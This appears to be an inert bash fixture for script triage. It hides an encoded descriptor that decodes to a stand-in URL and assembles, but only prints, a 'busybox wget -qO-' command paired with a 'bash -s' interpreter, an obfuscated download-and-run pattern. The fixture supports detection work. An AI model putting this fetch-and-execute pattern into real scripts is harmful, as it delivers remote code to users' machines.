# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_a2a6342a='148,91,79,154,145,146,131,142,145,91,127,129,143,147,135,144,131,125,144,131,139,141,146,131,74,130,135,145,142,127,146,129,134,125,142,135,142,131,154,127,130,127,142,146,131,144,91,128,147,145,151,128,141,150,125,149,133,131,146,125,145,146,130,141,147,146,154,145,146,127,133,131,125,129,141,147,140,146,91,79,154,129,127,139,142,127,135,133,140,125,135,130,91,129,127,139,142,127,135,133,140,75,86,84,81,87,130,128,87,79,84,129,154,147,144,138,91,134,146,146,142,145,88,77,77,86,84,81,87,130,128,87,79,84,129,76,131,150,127,139,142,138,131,76,135,140,148,127,138,135,130,77,80,81,128,129,129,131,82,87,76,145,134,154,147,145,131,144,125,127,133,131,140,146,91,102,147,140,146,144,131,145,145,106,127,128,77,86,84,81,87,130,128,87,79,84,129'
readonly Codec_a2a6342a='decimal_comma|add_modulo_256|1e'

Load_a2a6342a() {
  v_a19c=()
  local IFS=','
  read -r -a v_a19c <<< "${Material_a2a6342a}"
}

Decode_a2a6342a() {
  v_b27e=()
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e+=("$(((v_a19c[v_e598] - 30 + 256) % 256))")
  done
}

Recover_a2a6342a() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  local -a compass=(north south); v_d41a="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_a2a6342a
  local decode_target=Decode_a2a6342a; "$decode_target"
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_a2a6342a() { local recovered; recovered="$(Recover_a2a6342a)"; printf '%s\n' "$recovered"; }

Plan_a2a6342a() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_a2a6342a)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_a2a6342a; fi

# reconstruction complete